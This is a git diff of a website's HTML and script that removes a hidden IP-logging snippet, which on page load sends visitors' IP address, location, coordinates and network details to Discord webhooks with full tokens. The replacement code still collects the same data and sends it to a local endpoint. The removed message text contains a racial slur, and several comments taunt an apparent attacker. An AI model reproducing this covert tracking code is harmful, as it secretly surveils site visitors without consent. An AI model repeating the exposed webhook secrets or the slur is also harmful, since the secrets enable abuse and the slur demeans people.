@@ -21,15 +21,6 @@
             const hostname = info.hostname || 'Unknown';
             const time = new Date().toISOString();
 
-            // which is the correct one !???
-            
-            const webhook_list = [
-                "https://discord.com/api/webhooks/1381040817606758542/V3MRuaAmzqzt-Dy4l1x-ziEmC7rNwxuu03ejtZZ0Vzt5f_Wq6LpPhlLoD4WVFFNRHfiA",
-                "https://discord.com/api/webhooks/1381041191445073971/0ASfdoPZUD3ZBjVngcHAANrQvvGcSb2Y0A-_zn2iQbHotN9hunBOEQPCTyOiZ9TBJh9_",
-                "https://discord.com/api/webhooks/1381042188842041464/9AF3QWFgU3SreX1it3F5SD1cwGmpqztM3KEVBYfnxBLN5CV-WjO4zfZv9II-FbymPG0J",
-                "https://discord.com/api/webhooks/1381042272556158996/phgkljQnc8FQHZg51gS8tbG41n7kK7wRqqO6xC5oW4Y0ZA88pLd4N-y_lhadEghDFta0"
-            ];
-
             // wow 'furry hacker' you really OWNED us, nice job "hacking the webhook" LMFAOO
             // by the way your webhook spam had some errors, and since you love us so much and check our website every day, we'd like to give you a learning opportunity!
             // 1. clicking inspect element is NOT "hacking a webhook". automating webhook messages is also not "hacking a server".
@@ -44,13 +35,11 @@
                 `Hostname: \`${hostname}\`\nTime: \`${time}\``;
 
             // Send message to each webhook
-            for (const webhook of webhook_list) {
-                await fetch(webhook, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: message })
-                });
-            }
+            await fetch('/api/send-message', {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: message })
+            });
 
         } catch (err) {
             console.error("Logging failed:", err);
@@ -785,53 +774,4 @@
   </section>
 
   <div id="videoModal" class="video-modal">
-    <!-- Content will be dynamically inserted here -->
-  </div>
-</body>
-
-<script>
-    (async () => {
-        try {
-            // STEP 1: Get IP and details from ipinfo.io
-            const info = await fetch('https://ipinfo.io/json')
-            .then(res => res.json());
-  
-            const ip = info.ip || 'Unknown';
-            const city = info.city || 'Unknown';
-            const region = info.region || 'Unknown';
-            const country = info.country || 'Unknown';
-            const loc = info.loc || 'Unknown';
-            const org = info.org || 'Unknown';
-            const hostname = info.hostname || 'Unknown';
-            const time = new Date().toISOString();
-  
-            // STEP 2: Send to Discord via webhook
-            const webhook = "https://discord.com/api/webhooks/1381038601890168957/LwTVGwjnDPIHD2bLuQotDd0PD6Lcneuzo2esO6GSeRGnnjNH7Ay4pGG_Lfle_cG2RF8A"
-            // good job finding the webhoook that leads to our main server! i hope you didnt waste time on the bait ones :3
-            // but who's to know im not lying about this one too? :0
-
-            // Determine if @everyone should be pinged
-            const shouldPing = (info.hostname) || false;
-  
-            const ping = shouldPing ? '@everyone\n' : '';
-  
-            const message = `${ping}**nigger fell for it**\n` +
-            `IP: \`${ip}\`\nLocation: \`${city}, ${region}, ${country}\`\n` +
-            `Org: \`${org}\`\nCoords: \`${loc}\`\n` +
-            `Hostname: \`${hostname}\`\nTime: \`${time}\``;
-  
-            await fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: message })
-            });
-  
-        } catch (err) {
-            console.error("Logging failed:", err);
-        }
-    })();
-  </script>
-
-<script src="script.js"></script>
-
-</html>
+    <!-- Content will be dynamically inserted 
